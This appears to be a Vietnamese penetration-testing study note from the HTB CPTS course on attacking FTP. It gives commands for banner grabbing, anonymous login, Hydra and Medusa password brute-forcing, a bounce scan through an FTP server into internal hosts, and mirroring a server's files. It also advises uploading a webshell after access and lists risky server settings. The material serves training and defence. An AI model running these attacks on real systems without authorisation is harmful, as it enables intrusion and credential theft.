---
title: "Attacking FTP"
date: 2026-04-18 09:00:00 +0700
categories: [HTB_CPTS, Exploitation]
tags: [ftp, exploitation, file-transfer, common-services]
description: "HTB CPTS note về enumeration và khai thác dịch vụ FTP."
pin: false
---
Port: 21 (control) / 20 (data)

**Bản chất:** Giao thức truyền file không mã hóa — credential truyền plaintext qua mạng.

---
## Điểm yếu cốt lõi

- **Anonymous login:** nhiều server cho phép đăng nhập không cần mật khẩu (`anonymous:anonymous`)
- **Cleartext:** username/password có thể bị sniff trên wire
- **No rate limiting:** brute-force thường không bị chặn
- **Misconfigured permissions:** share có thể đọc/ghi file nhạy cảm

---
## Enumeration

```bash
# Banner grab bằng netcat
nc -v 192.168.2.142 21

# Nmap — banner + anonymous check + scripts
sudo nmap -sC -sV -p 21 <IP>
# -sC chạy ftp-anon tự động, output liệt kê file nếu anonymous login được phép
# Dấu [NSE: writeable] = thư mục anonymous có thể ghi
```

|Lệnh|Mô Tả|
|---|---|
|`ftp <FQDN/IP>`|Kết nối tới FTP|
|`nc -nv <FQDN/IP> 21`|Lấy banner FTP|
|`openssl s_client -connect <FQDN/IP>:21 -starttls ftp`|Kết nối FTPS|
|`wget -m --no-passive ftp://anonymous:anonymous@<IP>`|Tải toàn bộ file từ FTP|
|`nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst <FQDN/IP>`|Kiểm tra FTP bằng Nmap|

---
## Anonymous Login

Misconfiguration nguy hiểm nhất: server cho phép login với username `anonymous`, password để trống hoặc nhập bất kỳ email.

Nếu permission không được set đúng, attacker có thể đọc file nhạy cảm hoặc **upload script độc hại** — sau đó kết hợp với lỗ hổng khác (ví dụ path traversal trên web app) để execute file đó như PHP code.

```bash
# Kết nối FTP client + thử anonymous login
ftp 192.168.2.142
> anonymous
> anonymous@
```

Lệnh cơ bản sau khi đăng nhập:

```
ls -la          # liệt kê file (kể cả hidden)
cd /dir         # di chuyển thư mục
get file.txt    # download file
mget *.txt      # download nhiều file
put file.txt    # upload file
binary          # chuyển binary mode (bắt buộc khi transfer file không phải text)
passive         # bật passive mode nếu bị firewall
```

> **☠️ Dangerous Settings — FTP**
>
> |Setting|Nguy hiểm vì|
> |---|---|
> |`anonymous_enable=YES`|Cho phép đăng nhập không cần credentials|
> |`anon_upload_enable=YES`|Anonymous có thể upload file lên server|
> |`anon_mkdir_write_enable=YES`|Anonymous có thể tạo thư mục|
> |`no_anon_password=YES`|Không hỏi password khi login anonymous|
> |`xferlog_enable=NO`|Tắt logging → attacker không bị trace|
> |`write_enable=YES`|Mọi user đều có thể ghi file|
> |`ssl_enable=NO`|Không mã hoá → sniff được credentials|

---
## Brute-Force

```bash
# Hydra — single user
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142

# Hydra — user list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142

# Hydra — thêm thread và verbose
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142 -t 4 -V

# Medusa — single user
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp

# Medusa — user list
medusa -U users.txt -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
```

> **Hydra vs Medusa: cú pháp khác nhau nhưng cùng mục đích. Hydra dùng `-l`/`-L`, Medusa dùng `-u`/`-U`.**

> **Hầu hết ứng dụng hiện đại có rate limiting hoặc lockout — **Password Spraying** thường hiệu quả hơn brute-force toàn bộ wordlist.**

---
## FTP Bounce Attack

**Bản chất:** Lệnh `PORT` trong FTP cho phép client chỉ định IP:port để server kết nối vào. Attacker lợi dụng để bắt FTP server trung gian (exposed) **proxy scan** sang máy nội bộ (không exposed trực tiếp từ internet).

**Luồng tấn công:**

```
Attacker → FTP_DMZ (exposed, internet-facing)
                  ↓ PORT command chỉ vào Internal_DMZ
         Internal_DMZ (không accessible trực tiếp)
```

**Điều kiện:** Server FTP mục tiêu misconfigured — không chặn PORT tới địa chỉ ngoài client.

**Ứng dụng:** Internal port scan qua pivot FTP — lấy thông tin mạng nội bộ không accessible trực tiếp.

```bash
# Nmap FTP bounce scan — scan port 80 của 172.17.0.2 thông qua FTP server 10.10.110.213
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

# Cú pháp: -b <user>:<pass>@<ftp_proxy_ip>
```

> **Server FTP hiện đại thường đã block kỹ thuật này theo mặc định. Chỉ hiệu quả khi server misconfigured hoặc dùng phần mềm FTP cũ.**

---
## Post-Access

Sau khi có credentials, tìm kiếm:

- Config files (`.conf`, `.ini`, `.env`)
- Credentials được hardcode
- Web root nếu FTP trỏ vào `/var/www/html` → upload webshell
- Backup files (`.bak`, `.old`, `.zip`)
